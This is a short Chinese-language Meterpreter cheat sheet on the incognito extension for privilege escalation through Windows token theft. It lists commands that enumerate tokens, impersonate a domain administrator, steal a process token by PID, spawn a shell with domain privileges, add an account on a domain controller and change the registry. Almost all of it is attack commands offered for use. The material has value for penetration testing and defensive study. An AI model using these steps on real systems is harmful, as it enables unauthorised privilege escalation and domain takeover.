#  meterpreter incoginto 假冒用户

## 盗取令牌

## 加载功能

```
use incognito
```
列出目标主机用户的可用令牌

```
list_tokens -u     \\列出目标主机用户的可用令牌
```
```
list_tokens -g     \\列出目标主机用户组的可用令牌
```
```
impersonate_token DOMAIN_NAME\\USERNAME     假冒目标主机上的可用令牌,
```
> 如meterpreter > impersonate_token QLWEB\\Administrato
```
meterpreter >execute -f cmd.exe -i -t #调用域权限shell
```
```
add_user 0xfa funny –h192.168.3.98        #在域控主机上添加账户
```
```
reg command       # 在目标主机注册表中进行交互，创建，删除，查询等操作
```
> 另一个提权的方法是扮演一个帐户从一个特定进程偷取令牌。

## 为此，我们需要“incognito”扩展，使用
```
“steal_token+PID”
```
## 执行PS后，得到的信息可知， ADMIN的pid为xxx
PID可以为任何权限

![](img/1.gif)

> <h2>PS:所以我们在执行命令后虽然提示错误信息，但是它仍会被成功在后台执行
</h2>


这个例子中我们使用的是steal_token 640，其中由前面执行ps后得到的信息可知，PID为640的权限为administrator，所以我们在执行命令后虽然提示错误信息，但是它仍会被成功在后台执行，所以在运行steal_token后核实UID，我们的权限就变为了administrator了。

![](img/2.gif)
```
load incognito        --加载插件
```
## 列出当前用户`token`
```
list_token -u
```
## 伪造成域用户 记得要两个`\\`
```
impersonate_token XXXXX\\ADMINXXX      \伪装成域的账户 
```
## 调用域权限`shell`
```
execute -f cmd.exe -i -t   
```

























